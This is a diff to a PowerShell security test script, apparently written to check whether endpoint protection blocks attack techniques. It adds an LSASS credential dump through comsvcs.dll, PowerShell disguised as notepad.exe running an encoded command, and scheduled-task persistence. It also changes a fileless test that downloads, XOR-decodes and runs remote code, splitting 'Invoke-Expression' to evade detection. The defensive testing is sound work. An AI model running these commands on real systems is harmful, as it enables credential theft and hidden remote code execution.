@@ -167,6 +167,19 @@ function displaymenu($mitems) {
         Number = 36;
         Test = "Dump credentials using SQLDumper.exe"
     }
+    $mitems += [PSCustomObject]@{
+        Number = 37;
+        Test = "Dump credentials using COMSVCS"
+    }
+    $mitems += [PSCustomObject]@{
+        Number = 38;
+        Test = "Mask Powershell.exe as Notepad.exe"
+    }
+    $mitems += [PSCustomObject]@{
+        Number = 39;
+        Test = "Create scheduled tasks"
+    }
+
     return $mitems
 }
 
@@ -1208,7 +1221,19 @@ function backdoordrop() {
 function psfileless() {
     write-host -ForegroundColor white -backgroundcolor blue "`n--- 35. PowerShell script in fileless attack ---"
     write-host -foregroundcolor $processmessagecolor "Execute Fileless attack"
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI https://winatpmanagement.windows.com/client/management/static/WinATP-Intro-Fileless.txt -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0; $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i]; $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
+$body1 = @'
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI https://winatpmanagement.windows.com/client/management/static/WinATP-Intro-Fileless.txt -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0; $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i]; $i++; if ($i -eq $xor.Length) {$i = 0} };
+'@
+$body2 = @'
+Invok
+'@
+$body3 = @'
+e-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
+'@
+
+    $body = -join($body1,$body2,$body3)
+    $errorfile =".\errorfile.txt"
+    Start-Process powershell -ArgumentList $body -wait -WindowStyle Hidden -redirectstandarderror $errorfile
     write-host -foregroundcolor $warningmessagecolor "`nIf NOTEPAD is executed, then the test has FAILED`n"
     pause
 }
@@ -1232,6 +1257,72 @@ function sqldumper() {
         remove-item .\SQLDumper.exe
         write-host -foregroundcolor $processmessagecolor "Delete dump file`n"
         remove-item .\SQLD*.*
+    }
+}
+
+function comsvcs() {
+    write-host -ForegroundColor white -backgroundcolor blue "`n--- 37. Block RUNDLL32 COMSVCS dump process launch ---"
+    
+$body = @"
+rundll.exe %windir%\System32\comsvcs.dll, MiniDump ((Get-Process lsass).Id) .\lsass.dmp full
+"@
+    try {
+        $errorfile = ".\errorfile.txt"
+        Start-Process powershell -ArgumentList $body -wait -WindowStyle Hidden -redirectstandarderror $errorfile
+    }
+    catch {
+        write-host -ForegroundColor $processmessagecolor "Dump process execution failed`n"
+    }
+    if (test-path('.\lsass.dmp')) {
+        write-host -ForegroundColor $errormessagecolor "Test failed - dump created"
+        write-host -foregroundcolor $processmessagecolor "  Deleting lsass.dmp`n"
+        Remove-Item -Force -Path ('.\lsass.dmp')
+    } else {
+        write-host -ForegroundColor $processmessagecolor "Test succeeded - dump not created`n"
+    }
+    pause
+}
+
+function notepadmask () {
+    write-host -ForegroundColor white -backgroundcolor blue "`n--- 38. Mask PowerShell.exe ---"
+    write-host -ForegroundColor $processmessagecolor "Copy Powershell.exe to Notepad.exe in current directory`n"
+    if (test-path("$env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe")) {
+        copy-item -path "$env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe" -destination ".\notepad.exe" -force
+        .\notepad.exe -e JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==
+        write-host -ForegroundColor $warningmessagecolor "`nNo welcome message should have been displayed`n"
+        Pause
+        write-host -ForegroundColor $processmessagecolor "Remove notepad.exe from current directory`n"
+        remove-item (".\notepad.exe")
+    } else {
+        write-host -ForegroundColor $errormessagecolor "Unable to locate $env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe`n"
+    }
+
+}
+
+function schtsk () {
+    write-host -ForegroundColor white -backgroundcolor blue "`n--- 39. Create Scheduled Task ---"
+    $testflag = $false
+    $result = cmd.exe /c 'schtasks /Create /F /SC MINUTE /MO 3 /ST 07:00 /TN CMDTestTask /TR "cmd /c date /T > .\current_date.txt'
+    if ($result -match "SUCCESS") {
+        write-host -ForegroundColor $errormessagecolor "Scheduled task created"
+        $testflag = $true
+        $result = cmd.exe /c 'schtasks /Query /TN CMDTestTask'
+        if ($result -match "Ready") {
+            write-host -ForegroundColor $errormessagecolor "Scheduled task found"
+            $testflag = $true
+        }
+    }
+    if ($testflag) {
+        write-host -ForegroundColor $errormessagecolor "Test failed - Scheduled task created"
+        write-host -ForegroundColor $processmessagecolor "  Remove scheduled task"
+        $result = cmd.exe /c 'schtasks /Delete /TN CMDTestTask /F'
+    }
+    else {
+        write-host -ForegroundColor $errormessagecolor "Test succeeded - No Scheduled task created"
+    }
+    if (test-path -Path ".\current_date.txt") {
+        write-host -ForegroundColor $processmessagecolor "  Remove current_date.txt"
+        remove-item -Path ".\current_date.txt"
     }
 }
 
@@ -1308,6 +1399,9 @@ switch ($results.number) {
     34  {backdoordrop}
     35  {psfileless}
     36  {sqldumper}
+    37  {comsvcs}
+    38  {notepadmask}
+    39  {schtsk}
 }
 
 write-host -foregroundcolor $systemmessagecolor "`nSecurity test script completed"
